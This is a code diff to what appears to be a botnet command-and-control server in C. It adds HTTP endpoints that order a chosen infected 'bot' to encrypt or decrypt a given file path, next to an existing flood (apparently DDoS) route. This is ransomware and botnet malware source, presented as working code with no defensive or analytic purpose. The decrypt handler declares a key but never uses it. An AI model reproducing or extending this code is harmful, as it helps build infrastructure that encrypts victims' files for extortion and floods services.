@@ -164,6 +164,106 @@ void handle_upload_request(struct mg_connection *c, struct mg_http_message *hm) 
 
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
 }
+void handle_encrypt_request(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_id[256] = {0};
+    char file_path[256] = {0};
+
+    // Parse fields from the POST request
+    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
+    mg_http_get_var(&hm->body, "file_path", file_path, sizeof(file_path));
+
+    // Validate required fields
+    if (strlen(bot_id) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
+        return;
+    }
+
+    if (strlen(file_path) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File path is required\"}");
+        return;
+    }
+
+    // Find the target client
+    Client *client = find_client(&hash_table, bot_id);
+    if (client == NULL) {
+        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
+        return;
+    }
+
+    // Build the Command struct
+    Command cmd = {
+        .cmd_id = "ENCRYPT",
+        .order_type = ENCRYPT,
+        .delay = 0,
+        .program = strdup("ENCRYPT"),
+        .expected_exit_code = 0,
+        .params = malloc(2 * sizeof(char *)) // Allocate space for params
+    };
+
+    cmd.params[0] = strdup(file_path); // Add the file name as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
+
+    // Send the command to the client
+    if (send_command(client->socket, &cmd) < 0) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send encrypt command to client\"}");
+        free_command(&cmd); // Free dynamically allocated fields
+        return;
+    }
+
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
+    free_command(&cmd); // Free dynamically allocated fields
+}
+
+void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_id[256] = {0};
+    char file_path[256] = {0};
+    char key[256] = {0};
+
+    // Parse fields from the POST request
+    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
+    mg_http_get_var(&hm->body, "file_path", file_path, sizeof(file_path));
+
+    // Validate required fields
+    if (strlen(bot_id) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
+        return;
+    }
+
+    if (strlen(file_path) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File path is required\"}");
+        return;
+    }
+
+    // Find the target client
+    Client *client = find_client(&hash_table, bot_id);
+    if (client == NULL) {
+        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
+        return;
+    }
+
+    // Build the Command struct
+    Command cmd = {
+        .cmd_id = "DECRYPT",
+        .order_type = DECRYPT,
+        .delay = 0,
+        .program = strdup("DECRYPT"),
+        .expected_exit_code = 0,
+        .params = malloc(3 * sizeof(char *)) // Allocate space for params
+    };
+
+    cmd.params[0] = strdup(file_path); // Add the file path as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
+
+    // Send the command to the client
+    if (send_command(client->socket, &cmd) < 0) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send decrypt command to client\"}");
+        free_command(&cmd); // Free dynamically allocated fields
+        return;
+    }
+
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
+    free_command(&cmd); // Free dynamically allocated fields
+}
 
 // Function to handle sending a command to a client
 void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
@@ -511,6 +611,12 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
         } else if (strncmp(hm->uri.buf, "/api/flood", hm->uri.len) == 0) {
             output_log("Received flooding request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
             handle_send_command(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/encrypt", hm->uri.len) == 0) {
+            output_log("Received encrypt request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            handle_encrypt_request(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/decrypt", hm->uri.len) == 0) {
+            output_log("Received decrypt request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            handle_decrypt_request(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
             handle_server_status(c, hm, socket, connect, mg_http_reply);
         } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
